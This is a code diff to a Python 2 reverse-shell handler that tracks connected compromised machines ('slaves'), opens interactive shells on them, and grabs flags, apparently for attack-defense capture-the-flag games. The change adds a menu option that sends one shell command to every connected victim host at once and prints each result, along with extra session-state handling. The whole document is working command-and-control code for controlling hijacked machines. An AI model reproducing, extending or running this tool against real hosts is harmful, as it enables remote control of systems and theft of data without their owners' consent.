@@ -53,22 +53,39 @@ def transfer(h):
     slave = slaves[h]
     socket_fd = slave.socket_fd
     buffer_size = 0x400
+    interactive_stat = True
     while True:
+        if not slave.interactive:
+            interactive_stat = False
         buffer = socket_fd.recv(buffer_size)
+        if not slave.interactive:
+            interactive_stat = False
         if not buffer:
+            if not slave.interactive:
+                interactive_stat = False
             print "[+] No data, breaking..."
             break
+        if not slave.interactive:
+            interactive_stat = False
         sys.stdout.write(buffer)
         print ""
-    socket_fd.shutdown(socket.SHUT_RDWR)
-    socket_fd.close()
-    slave.remove_node()
+        if not interactive_stat:
+            break
+    if interactive_stat:
+        print "[-] Unexpected EOF!"
+        socket_fd.shutdown(socket.SHUT_RDWR)
+        socket_fd.close()
+        slave.remove_node()
+    else:
+        print "[+] Exiting interactive shell..."
+        return
 
 class Slave():
     def __init__(self, socket_fd):
         self.socket_fd = socket_fd
         self.hostname, self.port = socket_fd.getpeername()
         self.node_hash = node_hash(self.hostname, self.port)
+        self.interactive = False
         # self.banner = self.read_banner()
         # slave_fd.shutdown(socket.SHUT_RDWR)
         # slave_fd.close()
@@ -89,7 +106,16 @@ class Slave():
             self.remove_node()
             return False
 
+    def send_command_print(self, command):
+        self.send_command(command)
+        time.sleep(0.125)
+        print "[+] Executing : %s" % (command)
+        result = recvall(self.socket_fd)
+        print "[%s]" % ("-" * 32)
+        print result
+
     def interactive_shell(self):
+        self.interactive = True
         t = threading.Thread(target=transfer, args=(self.node_hash, ))
         t.start()
         try:
@@ -100,6 +126,7 @@ class Slave():
                 self.socket_fd.send(command + "\n")
         except:
             self.remove_node()
+        self.interactive = False
 
     def remove_node(self):
         print "[+] Removing Node!"
@@ -139,7 +166,8 @@ def show_commands():
     print "        5. [ ] : port forwarding (Under developing...)"
     print "        6. [gf] : get flag"
     print "        7. [gaf] : get all flag"
-    print "        8. [q|quit|exit] : interact an shell"
+    print "        8. [c] : command for all"
+    print "        9. [q|quit|exit] : interact an shell"
 
 def node_hash(host, port):
     return md5("%s:%d" % (host, port))
@@ -173,6 +201,12 @@ def main():
                 slaves[key].show_info()
         elif command == "p":
             slaves[position].show_info()
+        elif command == "c":
+            command = raw_input("Input command (uname -r) : ") or ("uname -r")
+            for i in slaves.keys():
+                slave = slaves[i]
+                print "[+] Command : %s" % (command)
+                result = slave.send_command_print(command)
         elif command == "g":
             input_node_hash = raw_input("[+] Please input target node hash : ") or position
             print "[+] Input node hash : %s" % (repr(input_node_hash))
